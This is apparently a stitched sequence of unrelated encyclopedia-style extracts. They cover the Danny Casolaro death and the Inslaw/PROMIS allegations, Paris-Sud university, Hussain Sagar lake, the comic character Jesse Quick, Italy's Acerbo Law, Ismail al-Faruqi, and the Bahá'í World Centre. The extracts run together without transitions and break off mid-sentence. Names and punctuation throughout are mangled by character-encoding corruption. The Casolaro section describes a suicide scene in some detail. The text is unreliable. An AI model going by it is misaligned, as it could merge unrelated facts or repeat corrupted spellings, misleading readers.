alone is enough to drive a sane man to madness. \\"If they ever make a movie of the Inslaw suit,\\" he writes, \\"it could be called Mrs. and Mrs. Smith Go to Washington and Meet Franz Kafka.\\" Inslaw's founder, William A. Hamilton, in a previous position with the U.S. Justice Department, had helped develop a program called PROMIS, short for Prosecutor's Management Information System. PROMIS was designed to organize the paperwork generated by law enforcement and the courts. After he left the Justice Dept, Hamilton alleged that the government had stolen PROMIS and had distributed it illegally, robbing him of millions of dollars. The department denied this, insisting that they owned it because Hamilton had developed it while working for them. As a result of this dispute, Hamilton and the department had been in litigation since 1983. A federal bankruptcy judge ruled in 1988 that the department had indeed taken the software by \\"trickery, fraud, and deceit,\\" a decision upheld by a federal district court in 1988, but overturned on appeal in 1991. A conspiracy theory developed around the case, with allegations that \\"back doors\\" had been inserted into the software so that whomever the Justice Department had sold it to could be spied upon. The major source on the conspiracy-theory aspect of the case, both for Hamilton and, later, for Casolaro, was Michael Riconosciuto, described by Rosenbaum as a \\"rogue scientist/weapons designer/platinum miner/alleged crystal-meth manufacturer... .\\" Riconoscuito had been introduced to a friend of Casolaro's by Jeff Steinberg, a longtime top aide in the LaRouche organization. Riconosciuto told Bill Hamilton that he and Earl Brian, a director of Hadron, Inc., a government consulting firm, had paid $40 million to Iranian officials in 1980 to persuade them not to release the American hostages before the conclusion of the presidential election that saw Ronald Reagan elected president of the United States; this is the claim now known as the \\"October Surprise\\". In exchange for his helping the Reagan administration, Brian was allegedly allowed to profit from the illegal distribution of the PROMIS system, according to Riconoscuito.See: House Report 102-857 , subsection IV, B, 2, \\"Sworn statement of Michael Riconosciuto\\", page 50 Brian, a close friend of then-Attorney General Ed Meese, has denied any involvement in either October Surprise or the Inslaw case. In addition to this allegation, Riconosciuto also claimed ‚Äî in a March 21, 1991 affidavit submitted to the court in the Inslaw caseCase No. 85-00070, affidavit: Michael J. Riconosciuto, March 21, 1991 ‚Äî that he had modified Inslaw's software at the Justice Department's behest so that it could be sold to dozens of foreign governments with a secret \\"back door,\\" which allowed outsiders to access computer systems using PROMIS. These modifications allegedly took place at the Cabazon Indian Reservation near Indio, California. Because the reservation was sovereign territory where enforcement of U.S. law was sometimes problematic, Riconosciuto further claimed that he had worked on weapons programs there for the Wackenhut Corporation, such as a powerful \\"fuel air explosive\\". On March 29, 1991, eight days after submitting the affidavit, Riconosciuto was arrested for, and later convicted of, distributing methamphetamine and methadone, charges that he said were a set-up to keep him from telling his story.See: The Inslaw Affair (House Report 102-857) , Section VII, D, \\"Department interferes with Michael Riconosciutio's sworn statement to the committee-refuses request to interview DEA agents\\", page 100, House Judiciary CommitteeDefendant Says Government Drug Charges Are Part Of Vendetta, Associated Press, January 2, 1992. In the summer of 1990, Casolaro arranged to meet Bill Hamilton, expressing an interest in pursuing the Inslaw story. Hamilton gave Casolaro a 12-page memo Riconoscuito had written detailing his allegations. Rosenbaum writes that, \\"The moment he got his hands on that maddening memo, with its maze of illusion and reality, was the moment Danny's life changed and he began his descent into the obsession that would lead to his death. He was slowly, then rapidly, sucked into a kind of covert-ops version of Dungeons & Dragons, with that memo as his guide and Michael Riconosciuto as his Dungeon Master.\\" Final days On August 8, 1991, Casolaro arrived in Martinsburg, West Virginia to meet a source who, he said, had promised to provide an important missing piece of his story. On August 5, 1991, Casolaro phoned Bill McCoy, a retired CID officer to tell him that Time magazine had assigned him an article about the Octopus. He further claimed to be working with reporter Jack Anderson, and that publishers Little, Brown and Time Warner had offered to finance the effort. All of these claims were later shown to be false: Little and Brown, for example, had rejected his Octopus manuscript over a month earlier. On the same day, Casolaro's friend Ben Mason agreed to talk to Casolaro about his finances. A few days later, Casolaro showed Mason a 22-point outline for his book and expressed frustration at having been tied up with a literary agent who was unable to sell it for the last eighteen months. He also allegedly complained about his sleep being disturbed for the previous three months by calls during the night. The following day, a neighbor of Casolaro's and long-time housekeeper, Olga, helped Casolaro pack a black leather tote. She remembers him packing a thick sheaf of papers into a dark brown or black briefcase. Casolaro said he was leaving for several days to visit Martinsburg, West Virginia, to meet a source who promised to provide an important missing piece to his story. This was the last time Olga saw him. Olga told The Village Voice that she answered several threatening telephone calls at Casolaro's home that day. She said that one man called at about 9:00 a.m. and said, \\"I will cut his body and throw it to the sharks\\". Less than an hour later, a different man said: \\"Drop dead.\\" There was a third call, but Olga remembered only that no one spoke and that she heard music as though a radio were playing. A fourth call was the same as the third, and a fifth call, this one silent, came later that night. =Last known sightings= According to The Village Voice, Casolaro's whereabouts between late in the day of August 8 and the afternoon of August 9 are unknown. The day before he died, according to The Martinsburg Morning Journal, he ate at a Pizza Hut, where he told the waitress he liked her eyes and quoted The Great Gatsby to her. He met Honeywell engineer William Richard Turner at the Sheraton at about 2:30 p.m. on August 9. Turner says he gave Casolaro some documents, and that they spoke for a few minutes. Witnesses reported that Casolaro spent the next few hours at a Martinsburg restaurant. A bartender there told police that he had seemed lonely and depressed. The police further learned that Casolaro was seen at Heatherfields, the cocktail lounge at the Sheraton, at around 5 p.m. with a man described by a waitress as \\"maybe Arab or Iranian.\\" At about 5:30 p.m. that night, Casolaro happened to meet Mike Looney who rented the room next to Casolaro's room 517. They chatted on two occasions‚Äîfirst at about 5:30 p.m. and then again at about 8:00 p.m. Looney later explained, \\"[Casolaro] said he was there to meet an important source who was going to give him what he needed to solve the case.\\" According to Looney, Casolaro claimed that his source was scheduled to arrive by 9:00 p.m. Around that time, Casolaro left Looney, explaining that he had to make a telephone call. He returned a few minutes later and said that his source might have \\"blown him off.\\" Casolaro and Looney talked until about 9:30 p.m. At about 10.00 p.m., Casolaro bought coffee at a nearby convenience store. That was the last time anyone reported seeing him alive. =Death= At about noon on August 10, 1991, housekeeping staff discovered Casolaro naked in the bathtub of room 517. His wrists had been slashed deeply. There were three or four wounds on his right wrist and seven or eight on his left. Blood was splattered on the bathroom wall and floor; and according to Ridgeway and Vaughn, \\"the scene was so gruesome that one of the housekeepers fainted when she saw it.\\" Under Casolaro's body, paramedics found an empty Milwaukee beer can, two white plastic liner-trash bags, and a single edge razor blade. There was also a half-empty wine bottle nearby. Ridgeway and Vaughan write that nothing was placed in the bathtub drain to prevent debris from draining away, and none of the bathwater was saved. Other than the gruesome scene, the hotel room was clean and orderly. There was a legal pad and a pen present on the desk; a single page had been torn from the pad, and a message written on it: \\"To those who I love the most: Please forgive me for the worst possible thing I could have done. Most of all I'm sorry to my son. I know deep down inside that God will let me in.\\" Based on the note, the absence of a struggle, no sign of a forced entry, and the presence of alcohol, police judged the case a straightforward suicide. After inspecting the scene, they found four more razor blades in their envelopes in a small package. Police interviews further revealed that no one had seen nor heard anything suspicious. The Martinsburg police contacted authorities in Fairfax, Virginia, who said they would notify Casolaro's family. =Police investigation= The first autopsy was performed on Casolaro's body at the University of Virginia on August 14, 1991. The coroner determined that blood loss was the cause of death, and that death had occurred from one to four hours before the body was discovered, or roughly between 8:00 a.m. and 11:00 a.m. on August 10. The day after Casolaro's body was found, Village Voice editor Dan Bischoff received an anonymous telephone call alerting him to Casolaro's death. By Tuesday, August 13, Ridgeway and Vaughan write, the \\"rumors were flying,...and by the next day, the crazies started coming out of the woodwork. There were vague unsubstantiated rumors that the Mafia was somehow involved, and the wildest story even suggested that the undertaker was an employee of the CIA, hired to clean up after an agency assassination.\\" Even at the funeral, they write, the family felt \\"engulfed by mysteries.\\" As the ceremony drew to a close, a highly decorated military officer in U.S. Army dress reportedly arrived in a limousine. Accompanied by another man in plain clothes, the military man approached the coffin just before it was lowered into the ground, laid a medal on the lid, and saluted. No one recognized either man and, to this day, they have never been identified. Further, Casolaro was known to have complained numerous times about threatening or unsettling phone calls directed at him, often occurring late at night, including those received by his housekeeper during his absences from his home. After Casolaro's death was reported by several mainstream news organizations, police re-examined room 517. The adjacent rooms had been rented the evening of Casolaro's death ‚Äî one by Mike Looney, the other by an unnamed family. No one reported hearing anything unusual either on the night of August 9 or the morning of August 10. In January 1992, about five months after Casolaro's death, Dr. Frost of the Virginia state medical examiner's office performed another autopsy; he returned a second suicide verdict, citing blood loss as the cause of death. Frost said there was evidence of the early stages of multiple sclerosis, but the degree of severity was probably minor. Toxicology analysis uncovered traces of several drugs: antidepressants, acetaminophen, and alcohol. He wrote: \\"There was nothing present in any way that could have incapacitated Casolaro so he would have been incapable of struggling against an assailant, let alone been sufficient to kill him.\\" Ron Rosenbaum, a journalist acquaintance of Casolaro's, speculated in Vanity Fair that Casolaro may have intended his suicide to appear to be murder triggered by his research, in order to have others look into the story after his death. Later investigations showed that the FBI misled Congress about investigating Casolaro's death. Members of an FBI task force looking into Casolaro's death \\"questioned the conclusion of suicide\\" and recommended further investigation. This level of doubt \\"was especially significant, because even at that time (December 1992), it was undertood that to express those views risked one's career.\\" FBI documents show that some files on Casolaro are being withheld from public release, which is contradicted by the FBI saying the files are missing entirely. In popular culture Dominic Orlando, Casolaro's cousin, wrote a play based on Casolaro's story in 2008 called Danny Casolaro Died For You. In January 2013, Aviation Cinemas Productions and Caliber Media optioned the film rights to the story of Danny Casolaro based on Orlando's play. Adam Donaghey, Eric Steele, Dallas Sonnier and Jack Heller are set to produce with Eric Steele directing. Production was set to begin in 2015.

History  Paris-Sud was originally part of the University of Paris, which was subsequently split into several universities. After World War II, the rapid growth of nuclear physics and chemistry meant that research needed more and more powerful accelerators, which required large areas. The Universit√© de Paris, the √âcole Normale Sup√©rieure and the Coll√®ge de France looked for space in the south of Paris near Orsay. Later some of the teaching activity of the Faculty of Sciences in Paris was transferred to Orsay. The rapid increase of students led to the independence of the Orsay Center on March 1, 1965. Now it hosts a great number of laboratories on its large (236 ha) campus. Many of the top French laboratories are among them especially in particle physics,Laboratoire de l‚ÄôAcc√©l√©rateur Lin√©aire. Lal.in2p3.fr.

International Recognition Heart of the world by UNWTO Hussain Sagar, a heritage site of India was declared as the 'Heart of the World' by UNWTO on 27 September 2012, on the occasion of World Tourism Day, for being the World's Largest Heart-Shaped Mark, the World's Heritage Heart- Shaped Mark, and the World's Wonderful Heart-Shaped Mark on the face of the earth among the heart-shaped marks formed by the heart-shaped lakes and islands that exist in the world. Logo for the 'Heart of the World' was inaugurated by H.E. Mr. Taleb Rifai, Secretary-General, United Nations World Tourism Organisation (UNWTO), Madrid-Spain, in the year 2013. World's Largest Heart-Shaped Mark Hussain Sagar lake is the largest heart-shaped mark among the marks formed by 78 heart-shaped lakes and 9 heart-shaped islands on the face of the earth. UNESCO world Heritage site tentative list Hussain lake is one of the Qutub Shahi monuments of Hyderabad-Telangana, out of which Golconda Fort, Qutub Shahi Tombs, and Charminar were already placed in the tentative list of World Heritage Sites of UNESCO. World's Wonderful Heart-Shaped Mark This lake has many outstanding universal values of love around it in addition to its heart shape, the symbol of love, which explores the wonder of love in the world. King built the lake for his people's drinking & irrigation purpose out of his love towards his people. King Ibrahim named the lake after Hazrath Hussain Shawali (Sufi saint, medical practitioner and architect of the lake) as a sign of gratitude for Hussain's treatment that was given to the king during his sickness and made him recover from the sickness. Many historical monuments were placed on the bank. Environmental conditions and conservation Hussain Sagar Lake forms an important part of Hyderabad but now has become the main sewage collection zone of the twin cities of Hyderabad and Secunderabad. As a result of heavy anthropogenic pressures such as unplanned urbanization, the entire ecosystem of Hussain Sagar Lake has changed. The water quality has deteriorated considerably during the last three decades. The lake has become shallow due to siltation and accumulation of plant debris. A 2008 study of the lake's water and sediment has found that it has exceeded its eutrophic condition, reaching hypereutrophic status. Many undesirable changes in the structure of biological communities have resulted, and some important species have either declined or completely disappeared. Realizing the importance of conservation of Hussain Sagar Lake, a project has been formulated. This project shall be implemented by APPCB, Hyderabad, India. In this respect, a project feasibility report has been prepared for approval and financing. In spite of the commission of a sewage treatment plant on the western side, a large amount of untreated sewage and industrial effluents continue to flow into the lake.

Chambers, who first used the superhero name Jesse Quick and later Liberty Belle, is the daughter of Golden Age heroes Johnny Quick and Liberty Belle. She inherited both of her parents' powers. A version of Jesse Chambers renamed Jesse Wells appeared as a recurring character on The CW television series The Flash played by Violett Beane. This version was the daughter of the Earth-2 counterpart of Harrison Wells. Publication history The 1992 limited series Armageddon: Inferno re-introduced the Justice Society of America after their disappearance into and re-emergence from the limbo dimension of Ragnarok (where they had been trapped since 1986's The Last Days of the Justice Society). Subsequently, a new Justice Society of America series (vol. 2) debuted. The series' first issue introduced the character of Jesse Chambers. Thereafter, Jesse became a supporting character in The Flash (vol. 2) as Wally West's partner, Jesse Quick. She also spends a brief run on Booster Gold's team The Conglomerate, when he leaves the JLA. In 1999, Jesse was featured in a lead role in writer Devin Grayson's series Titans, which ran until 2002. After 50 issues, Titans was cancelled and ultimately relaunched in writer Judd Winick's Titans/Young Justice: Graduation Day limited series. Jesse was not part of the new roster of Titans introduced after Graduation Day. Following Graduation Day, Jesse played a small supporting role in Geoff Johns and David Goyer's JSA series, where she served as Rick Tyler's love interest. When the book relaunched in 2006 as Justice Society of America (vol. 3), Jesse was featured as one of the main characters, now going by the name of Liberty Belle. She served primarily under the Liberty Belle name until Johns' 2009 limited series, Flash: Rebirth, where she returned to the Jesse Quick identity. She continued to feature as one of the leads in Justice Society until late 2010, when she was brought over to the writer James Robinson's revamp of the Justice League of America (vol. 2) series. In addition, the character was the star of the Liberty Belle & Hourman back-up feature in JSA All-Stars from issue #2 of the series. Written by Jen Van Meter and drawn by Travis Moore, the series was an action/romance feature which chronicled the adventures of Jesse and her husband Rick as they battled the villainous couple of Tigress and Icicle. The series had its finale in JSA All-Stars #10 in October 2010. Fictional character biography =Origin and early career= In hopes of creating a successor, Johnny Quick taught the formula that gave him his enhanced speed to his daughter, Jesse. The formula worked on Jesse as well and she gained super-speed. However, rather than becoming a costumed crime fighter as her father had intended, Jesse instead opted to continue her education as her mother requested. While Jesse was studying at Gotham University, the superhero team her parents had been colleagues with, the Justice Society of America, reemerged following a long absence. Naturally, her thesis topic became \\"The Impact of Superheroes on Society\\" and she began to follow the returned heroes, cataloging their adventures. When her father asked her to deliver some documents to the Society, the encounter would result in her aiding the team as Jesse Quick, finally living up to her father's dream of her being a costumed crime fighter. It was during that time that she met Wally West, the Flash, who would later ask her to be his replacement if something were to happen to him. It was all an elaborate plan on his part, trying to force Bart Allen, Impulse, to take his role in the legacy of the Flash more seriously and be Wally's successor. Although she felt betrayed, she would end up saving Wally's life, though her leg was hurt in the process. When Wally returned from the mythical Speed Force, he healed her leg, and the earlier deception was largely forgiven but not forgotten. When, shortly after, Jesse lost her enhanced speed, the person she blamed was Wally who had been directly using the Speed Force energies instead of simply tapping them like the other speedsters did. In fact, it turned out to be the villain Savitar who was the cause, having severed her connection to the Speed Force, as well as multiple other speedsters. Nonetheless, Wally chose the depowered Jesse to accompany him to Savitar's lair where she succeeded in regaining her powers. During the following battle with Savitar, her father gave his life in order to protect his daughter from one of Savitar's forces and merged with the Speed Force. Although Wally would ultimately triumph over the villain, Jesse was left to mourn her father. Per Degaton told her she would do something terrible, destroying the world. =Titans= Jesse accepted the reins of managing her father's corporation, Quickstart Enterprises, while also operating as Jesse Quick, even joining the members of the Titans to stop a nuclear threat. When the Titans were later going through a reorganization, Wally, a founding member, selected Jesse to join the roster, hoping to soothe their old wounds. After initially declining the offer, she ultimately joined the Titans, but was only on the team for a short time, feeling herself to be second-best to Wally. Nightwing, another founding member, persuaded Jesse to return to the Titans. Later, Jesse became involved in a murder mystery involving her own widowed mother, Libby Lawrence. The victim was Philip Geyer, Libby's fianc√©. An investigation by the Titans revealed not only the killer but also an ongoing affair between Philip and Jesse which had contributed to his death. Although Jesse attempted to reconcile with her mother, the saddened Libby found it hard to forgive her daughter although she apparently did, as in later appearances the two had returned to their friendly relationship. The Titans were disbanded not long afterwards, as two of the team's members were killed in an attack by a rogue Superman robot in the limited series Titans/Young Justice: Graduation Day. =Powerless= Jesse saving Wally West during the battle with Zoom. Following that disbanding of the team, Jesse threw herself back into her responsibilities at Quickstart Enterprises, finding little time for a social life. When Wally would later need assistance to defeat the villain Zoom who was capable of moving at speeds surpassing any of Earth's other speedsters, Jesse lent Wally a portion of her special abilities, temporarily boosting Wally's speed so that he was moving almost faster than light and allowing him to defeat Zoom, but leaving her powerless and unable to remember the formula to access her powers. Although Wally knew the formula, she told him not to remind her, reminding him that he had earlier told her that she needed to slow down anyway. After that, she worked as business manager for a newly reformed Justice Society of America. The JSA successfully rescued her mother, who had returned to her role as Liberty Belle, but whose powers had gone out of control. In that same adventure, mother and daughter reconciled. =One Year Later= Jesse had become a member of the Justice Society, carrying on her mother's legacy as the new Liberty Belle. She is now married to fellow second- generation hero Rick Tyler, also known as Hourman.Justice Society of America Vol. 3 #1. DC Comics. After hearing the news of Bart Allen's death, she, along with Jay Garrick, mourned his demise; her reaction to Wally West's return from the Speed Force is as yet unknown. In an encounter with Zoom, it is revealed that Jesse has retained her speed powers by repeating her father's formula. This adds to her super-strength, which means she inherited both of her parents' powers. In the same encounter, she talks the hero Damage out of murdering Zoom.Justice Society of America Vol. 3 #8. DC Comics. In The Flash: Rebirth mini-series, an explosion suddenly occurs in front of the pair. Jesse is shocked to see her father Johnny Quick is alive in the Speed Force, as he materializes and begs Barry Allen not to hurt Jesse before vanishing (but he dies later by Professor Zoom's actions).The Flash: Rebirth #3 (June 2009). DC Comics. Hourman is tending to Jesse, who (since seeing her father) has begun repeating her father's speed formula over and over. Jesse, now crackling with Speed Force energy, stops repeating the Speed Formula. She reveals that she has finally solved the equation: \\"Jesse Quick. Max Mercury. Jay Garrick. Wally West. Bart Allen. Barry Allen. The Speed Force\\".The Flash: Rebirth #4 (August 2009). DC Comics. When Wally West's twins Jai and Iris are struck with crippling pain thanks to Professor Zoom, Iris takes Jai's connection to the Speed Force and nearly kills herself doing so. Jesse arrives and recites the now-revealed Speed Mantra to revive Iris, telling Jai and Linda West that Iris is the next generation of speedsters. The two join the battle between the revealed Professor Zoom and the combined forces of the three Flashes (Jay, Wally, and Barry), Max Mercury, and Kid Flash. With the speedsters reunited, Wally uses a trick with the Speed Force, revitalizing the speedsters and transforming his, Jesse's, and Iris's outfits. Jesse dons a uniform patterned after her father's.The Flash: Rebirth #5 (November 2009). DC Comics.

Jesse says that she has a uniform like his and quickly changes into it by reciting the mathematical formula that her father originally used and calls herself Jesse Quick. The two speedsters then run off.Blackest Night: JSA #2 (January 2010). DC Comics. While she is running across the globe with her father trying to enjoy the time she's spending with him, she thinks she should rather be with her husband, the modern-day Hourman. Jesse continues to run with her father, remembering her childhood memories of when they used to jog together around their neighborhood and Johnny would let her win, feeling thankful that she was able to spend only a few moments with him again. Later, Black Lantern Johnny Quick is destroyed by Mr. Terrific's machine that turned off the Black Lanterns' connection to their rings.Blackest Night: JSA #3 (February 2010). DC Comics. When the JSA splits into two teams,Justice Society of America Vol. 3 #33 (November 2009). DC Comics. Jesse remains with the JSA, while her husband Rick went to the JSA All-Stars. However, Rick and Jesse remain happily married, although her teammates and the public at large believe otherwise, forcing Rick to explain their condition as \\"a working couple working in different offices\\".Justice Society of America Vol. 3 #34 (December 2009). DC Comics. At Wonder-Con, writer James Robinson announced that Jesse would be joining the Justice League of America as part of DC's Brightest Day event. This development occurred at the conclusion of the JLA/JSA crossover, The Dark Things, with Batman asking Jesse to join the JLA in order to fill her old friend Wally West's role as the team speedster.Justice League of America Vol. 3 #48. DC Comics. During her tenure with the JLA, Jesse gradually begins to lose her speed abilities, and it is eventually revealed that this is due to her becoming pregnant.

In the \\"Watchmen\\" sequel \\"Doomsday Clock\\", Jesse in her Liberty Belle outfit is seen with the Justice Society when Doctor Manhattan undoes the experiment that erased the Justice Society of American and the Legion of Super-Heroes.Doomsday Clock #12 (December 2019). DC Comics. Powers and abilities Just like her father, Jesse has powers of flight and accelerated speed, resulting from the state of mind achieved from the visualization of the speed-formula: 3X2(9YZ)4A. Her powers are linked to the Speed Force. She also has her mother's super-strength, enabling her to lift great weights, such as a car, with ease. As with her mother, the mechanism of her super-strength remains unexplained, which irritated her father. She attributes her powers to a \\"mantra\\" like the formula used by her father to unlock his speed. She also has superhuman stamina, superhuman reaction/reflexes and superhuman agility.

The purpose of it was to give Mussolini's fascist party a majority of deputies. The law was used only in the 1924 general election, which was the last competitive election held in Italy until 1946. Background In 1922, Benito Mussolini became the prime minister of Italy as a result of the March on Rome. However, he still only had 35 deputies in Parliament and 10 Nationalist allies. He was in a weak position and relied on the coalition with other parties that could easily unravel and force King Victor Emmanuel III to dismiss him. The idea was to change the voting system from proportional representation to a system which would allow Mussolini to have a clear majority.  Terms of the law  The Acerbo Law stated that the party gaining the largest share of the votes ‚Äì provided they had gained at least 25 percent of the votes ‚Äì gained two-thirds of the seats in parliament. The remaining third was shared amongst the other parties proportionally. Reasoning Mussolini could only count on the support of 35 Fascist deputies and 10 Nationalists. The law was passed on a majority vote. The obvious question is why a majority of deputies from other parties voted for the law knowing that one way or another Mussolini would gain the 25% required. The Socialists voted against it but made no effort to coordinate other parties to oppose it. The PPI or Popolari were divided and leaderless after Mussolini had engineered the dismissal of Luigi Sturzo. The official policy was to abstain but 14 deputies voted for the measure. The smaller Liberal parties generally voted in favour. They lacked clear direction and many believed Mussolini's talk of strong government or hoped to keep their positions. There is no doubt that the presence of armed squadristi in the Chamber intimidated many into voting for the measure. The 1924 election An election was held straight afterwards under the new rules. The result has to be viewed with some suspicion given widespread violence, intimidation and vote rigging. His opponents were demoralised and unable to put up any coordinated opposition. Also many of the new Fascist deputies were ex-Liberal deputies who commanded a substantial personal following especially in the South.

He spent several years at Al-Azhar University in Cairo, then taught at several universities in North America, including McGill University in Montreal. He was Professor of Religion at Temple University, where he founded and chaired the Islamic Studies program. Al-Faruqi was also the founder of the International Institute of Islamic Thought. He wrote over 100 articles for various scholarly journals and magazines in addition to 25 books, of the most notable being Christian Ethics: A Historical and Systematic Analysis of Its Dominant Ideas. He also established the Islamic Studies Group of the American Academy of Religion and chaired it for ten years. He served as the vice-president of the Inter-Religious Peace Colloquium, The Muslim-Jewish- Christian Conference and as the president of the American Islamic College in Chicago. Al-Faruqi and his wife, Lois Lamya al-Faruqi, were stabbed to death in their home in Wyncote, Pennsylvania, on May 27, 1986. Early life and education Al-Faruqi was born in Jaffa, in British-mandate Palestine (now part of Tel Aviv, Israel).https://www.findagrave.com/memorial/135000404/ismail-raji-al_faruqi His father, 'Abd al-Huda al-Faruqi, was an Islamic judge (qadi) and a religious man well-versed in Islamic scholarship. Faruqi received his religious education at home from his father and in the local mosque. He began to attend the French Dominican Coll√®ge des Fr√®res de Jaffa in 1936. His first appointment was as a registrar of cooperative societies (1942) under the British Mandate government in Jerusalem, which appointed him in 1945 the district governor of Galilee. Subsequent to the partition plan of Palestine, and the creation of the independent Jewish state of Israel in 1948, al-Faruqi at first emigrated to Beirut, Lebanon, where he studied at the American University of Beirut, then enrolled the next year at Indiana University's Graduate School of Arts and Sciences, obtaining his M.A. in philosophy in 1949. He was then accepted for entry into Harvard University's department of philosophy and was awarded his second M.A. in philosophy there in March 1951, with a thesis entitled Justifying the Good: Metaphysics and Epistemology of Value (1952). His dissertation was deeply influenced by the phenomenology of Max Scheler (1874‚Äì1928), particularly the latter's notion of axiological intuitionism. Al-Faruqi argued that Scheler's axiological intuitionism privileged feeling as knowing, thus recognizing the logic of the heart as an a priori emotional intuition of value. Such recognition could justify carving out a conceptual as well as practical space for the emergence of a critique of post-Enlightenment Reason from the standpoint of a non-Western philosopher. However, he decided to return to Indiana University; he submitted his thesis to the Department of Philosophy and received his PhD in September 1952. By then he had a background in classical philosophy and the developing thought of the western tradition. At the beginning of 1953, he and his wife were in Syria. He then moved to Egypt, where he studied at Al-Azhar University (1954‚Äì1958) again with a view to acquiring another PhD. In 1958, al-Faruqi was offered a position as a visiting fellow at the Faculty of Divinity at McGill University in Canada. During his two-year tenure at McGill, he studied Christian theology and Judaism, and became acquainted with the famous Pakistani Muslim philosopher Fazlur Rahman. During these years, al-Faruqi was preoccupied with his anti-Zionist Arab identity. Rahman reminisced in 1986 that al-Faruqi's blunt anti-Zionism and his refusal to play the detached scholar \\"frightened\\" his McGill colleagues. Although he was soft-spoken with unfailing smiles, at McGill he was considered to be, in Rahman's words, \\"an angry young Muslim Palestinian\\". In order to challenge al-Faruqi's Arabocentric views of Islam, and to broaden his scope of understanding the ummah, in 1961, Rahman arranged a two-year appointment for him in Pakistan at the Central Institute of Islamic Research. Rahman intended to expose al-Faruqi to the cultural diversity of Muslims and their contributions to Islam. \\"Except\\", Rahman (1986) later recalled, \\"it was his Arabism which drew a great deal of fire both inside and outside the Institute, as well as his academic preference for Cairo\\". From Arabism to Islamism In 1963, after returning to the United States, he was hired as a visiting professor at the University of Chicago's Divinity School. Between 1964 and 1968, al-Faruqi established himself as an associate professor at the Department of Religion at Syracuse University, where he initiated its programme in Islamic Studies. In 1968, he accepted a position at Temple University as a professor of religion, where he also founded the Islamic Studies Programme. He held that position until his death in 1986. Much of al-Faruqi's early thought is associated with what he called urubah (Arabism). In his 1962 book, On Arabism: Urubah and Religion, he argued that urubah comprises the core identity and set of values which embrace all Muslims, a single community of believers (ummah). Al-Faruqi formulated the notion of urubah in contradistinction to two other hegemonic ideologies: Arab nationalism and non-Arab Islamic revivalism. Adopting an overtly essentialist position, he argued that more than merely the language of the Qur'an, Arabic provided the only possible linguistic structure within which the Islamic conception of the world could be apprehended. Therefore, he asserted that urubah captured the core of Muslim consciousness, its values and faith ‚Äì it was inseparable from the identity of all Muslims (al-Faruqi, 1962: 2‚Äì30). He also maintained that urubah was the only context within which the non-Muslim Arabs countries could integrate into their larger societies. Even non-Muslim Arabs, according to al-Faruqi, could identify with urubah expressed in the Qur'an. In effect, urubah left non-Muslim Arabs and non-Arab Muslims at the mercy of combined linguistic and religious essentialisms. Any other form of consciousness and identity was a distortion created by colonial penetration (al-Faruqi, 1962: 211). Though few would question Arab influence on non-Arab Muslim faith and culture or Arab Muslim influence on non-Muslim Arabs, the implication that they both find their ultimate expression and fulfilment in al-Faruqi's interpretation of Arabism might be regarded by some as an attempt to establish the hegemony of Arab Islam or, more precisely, Arab Muslim culture. Both Arab nationalists and non-Arab Muslim intellectuals shunned al- Faruqi's agenda to bring non-Arab Muslims and non-Muslim Arabs together through urubah. While many Muslim intellectuals such as Fazlur Rahman agreed with al-Faruqi's assertion that the Qur'an could not achieve the same eloquence and expressiveness in any other languages except Arabic, they were critical of al-Faruqi's blatant Arab chauvinism. Al-Faruqi's sojourn in Pakistan did little to alter his doctrine of urubah. It was in the United States several years later that he began to question the foundations of his earlier position. In 1968, for the first time he encountered members of the Muslim Students' Association (MSA) at Temple University. The convergence of Muslim students from diverse cultural backgrounds dramatically swayed his perception of Arab versus Islamic identity. In the spring of 1968, while a patient at the Johns Hopkins Ophthalmology Centre, al-Faruqi confided in one of the active members of the MSA, Ilyas Ba-Yunus, \\"Until a few months ago, I was a Palestinian, an Arab, and a Muslim. Now I am a Muslim who happens to be an Arab from Palestine\\" (Ba-Yunus, 1988: 14). Scholarly Achievements Al- Faruqi's signature Al-Faruqi's early emphasis was on Arabism as the vehicle of Islam and Muslim identity. He was also one of those who proposed the idea of Islamization of knowledge and founded the International Institute of Islamic Thought (IIIT) together with Taha Jabir Alalwani, Abdul Hamid AbuSulayman, former Rector of International Islamic University Malaysia (IIUM), and Anwar Ibrahim, in 1980. During his years as a visiting professor of Islamic studies and scholar-in-residence at McGill University, a professor of Islamic studies at Karachi's Central Institute of Islamic Research as well as a visiting professor at various universities in Northern America, he wrote over 100 articles for various scholarly journals and magazines in addition to 25 books, of the most notable being Christian Ethics: A Historical and Systematic Analysis of Its Dominant Ideas. He also established the Islamic Studies Group of the American Academy of Religion and chaired it for ten years. He served as the vice-president of the Inter-Religious Peace Colloqium, The Muslim-Jewish- Christian Conference and as the president of the American Islamic College in Chicago. Al-Faruqi viewed the existence of Israel as an affront towards Judaism due to its state ideology of Zionism. He said that the injustice caused by Zionism is such as to necessitate war. He proposed a resolution in which Israel is dismantled and its institutions de-Zionised, and that former Israeli Jews who have renounced Zionism would live as an \\"ummatic community\\" and move freely throughout the Muslim world: Death In May 1986, Al-Faruqi and his wife were murdered in their Pennsylvania home, in a knife attack committed by a Black Muslim, Joseph Louis Young, who was also known by the Muslim name, Yusuf Ali. Young confessed to the crime and was sentenced to the death penalty and died in prison of natural causes in 1996.

The World Centre consists of the Shrine of Bah√° ºu'll√°h near Acre, Israel, the Shrine of the B√°b and its gardens on Mount Carmel in Haifa, Israel, and various other buildings in the area including the Arc buildings. Much of the international governance and coordination of the Bah√° º√≠ Faith occurs at the Bah√° º√≠ World Centre. These include decisions that affect the religion on a global level, and the study and translation of the Bah√° º√≠ holy writings. The Universal House of Justice, representing the supreme governing body of the Bah√° º√≠ Faith, resides in Haifa. The Bah√° º√≠ World Centre is also the current destination for Bah√° º√≠ pilgrimage. The Bah√° º√≠ World Centre has its historical origins in the area that was once Ottoman Syria. This dates back to the 1850s and 1860s when the Shah of Iran and the Sultan of the Ottoman Empire,  ªAbdu'l- ªAziz, successively exiled Bah√° ºu'll√°h from Iran to the fortress of Acre for lifetime incarceration. Many of the locations at the Bah√° º√≠ World Centre, including the terraces and the Shrine of the B√°b which constitute the north slope of Mount Carmel, were inscribed on the World Heritage List in July 2008. History Shrine of the B√°b and the lower terraces at night The location of the administrative centre was a result of a successive number of banishments and imprisonments of Bah√° ºu'll√°h, founder of the Bah√° º√≠ Faith. Bah√° ºu'll√°h was banished from Persia by Nasser-al-Din Shah in 1853, at which time Bah√° ºu'll√°h went to Baghdad in the Ottoman Empire. Later he was exiled by the Sultan of the Ottoman Empire, at the behest of the Persian Shah, to territories further away from Iran and finally to Acre in Ottoman Syria in 1868. Bah√° ºu'll√°h lived out the rest of his life in the area and he communicated with his followers throughout the Middle-East, Central Asia and India through special couriers, and Acre became the centre of the expanding network of Bah√° º√≠ groups. When Bah√° ºu'll√°h's imprisonment was eased, the area also became a centre of 